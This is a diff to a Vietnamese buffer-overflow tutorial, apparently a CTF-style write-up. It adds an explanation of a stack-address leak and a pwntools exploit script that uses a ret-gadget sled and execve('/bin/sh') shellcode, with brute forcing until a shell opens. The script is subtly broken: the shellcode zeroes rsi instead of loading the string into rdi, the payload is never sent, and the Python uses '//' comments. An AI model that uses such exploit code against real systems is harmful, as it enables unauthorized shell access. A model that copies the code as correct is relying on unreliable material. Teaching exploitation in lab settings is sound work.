@@ -232,7 +232,7 @@ Việc cuối cùng cần làm là nạp payload chứa địa chỉ saved rbp g
 
 ![Alt text](image/buffer-overflow35.png)
 
-Ở hàm main có nhập dữ liệu qua fgets(). Nhưng fgets() chỉ cho phép đọc từ đầu vào 80 BYTE bao gồm cả NULL BYTE (\0) ở cuối. Vậy nên thực tế chỉ nhập được 79 BYTE vào buffer.
+Ở hàm main có nhập dữ liệu qua fgets(). Nhưng fgets() chỉ cho phép đọc từ đầu vào 80 BYTE bao gồm cả NULL BYTE (\0) ở cuối. Vậy nên thực tế chỉ nhập được 79 BYTE vào buffer. Không có lỗi. Nhưng chương trình leak cho ta địa chỉ stack.
 
 ![Alt text](image/buffer-overflow36.png)
 
@@ -246,3 +246,35 @@ Sau khi nhập 512 BYTE thì saved rbp đã bị ghi đè byte cuối làm cho �
 
 Chính vì thế ta cần brute force để hy vọng địa chỉ ghi đè sẽ trỏ vào vùng nhớ mà ta để shellcode bên trong. Để tăng cơ hội brute force thành công thì cần lấp đầy buffer bằng nghiều gadget ret. Khi đó dù dính chỉ 1 trong các gadget đó sẽ chuyển hướng đến vùng nhớ chứa shellcode.
 
+Sau cùng dùng stack leak tính offset đến nơi chứa shellcode rồi nhập vào sau gadget ret cuối. 
+
+Code:
+
+    p.sendlineafter(b'name: ',b'A'*8)
+    p.recvuntil(b'I have a gift for you: ')
+    stack_leak=int(p.recvline(),16)
+    log.info('Stack_leak: '+hex(stack_leak))
+    
+    shellcode=asm(
+    	'''
+    	mov rax, 29400045130965551
+    	push rax
+    
+    	mov rax,59
+    	mov rsi, rsp
+    	xor rsi, rsi
+    	xor rdx,rdx
+    	syscall
+    	''',arch='amd64'
+    	)
+    
+    ret= 0x000000000040101a
+    payload=p64(ret)*0x30            // Đưa một loạt ret vào buffer để tăng tỉ lệ trúng địa chỉ
+    payload+=p64(stack_leak - 0x88) // Trừ offset để đến dịa chi chứa shellcode
+    payload+=shellcode
+    payload=payload.ljust(0x200,b'A')
+    p.interactive()
+
+Viết xong code rồi thì chỉ cần brute force liến tục đến khi vào được shellcode và gọi execv '/bin/sh'.
+
+Extra note: Dùng lệnh `set disable-randomization off` để hỗ trợ theo dõi sự thay đổi của Stack. 
